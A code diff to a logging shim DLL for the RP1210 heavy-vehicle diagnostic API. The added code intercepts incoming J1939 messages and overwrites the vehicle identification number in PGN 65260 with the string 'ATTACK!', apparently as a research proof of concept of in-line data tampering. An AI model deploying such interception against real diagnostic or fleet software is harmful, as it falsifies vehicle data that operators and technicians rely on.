@@ -12,9 +12,13 @@ simpleRP1210.exe shimDLL.dll 1
 #include <stdio.h>
 #include <string.h>
 
+
+
 /* Enabling Logging is slow now and the recieve buffers may overflow.*/
 /* Loggint opens on client connect and closes on client disconnect*/
 #define ENABLE_LOGGING
+
+#define PGN4VIN 65260
 
 HMODULE dll_module;
 FILE* hLogFile;
@@ -123,8 +127,28 @@ short __declspec(dllexport) WINAPI RP1210_ReadMessage(
 					nBufferSize,
 					nBlockOnRead);
     }
+    /* Manipulate Data here!!*/
+    if (status > 0){ 
+        // Find PGNs that are interesting
+        unsigned long pgn =  fpchAPIMessage[4] + (fpchAPIMessage[5] << 8) + (fpchAPIMessage[6] << 16);
+        if (pgn == PGN4VIN){ // Look for the VIN to break
+            #ifdef ENABLE_LOGGING
+                fputs("\nFound PGN4VIN", hLogFile);
+            #endif
+            /*Directly manipulates the bytes in the buffer.*/
+            fpchAPIMessage[21] = 'A';
+            fpchAPIMessage[22] = 'T';
+            fpchAPIMessage[23] = 'T';
+            fpchAPIMessage[24] = 'A';
+            fpchAPIMessage[25] = 'C';
+            fpchAPIMessage[26] = 'K';
+            fpchAPIMessage[27] = '!';
+        }
+    }
+
     /* Make a print of the data bytes*/
 #ifdef  ENABLE_LOGGING
+    
     if (status != 0){
         sprintf_s(messagelog,sizeof(messagelog),
             "\n%02d,RM,%d,%d,%d",
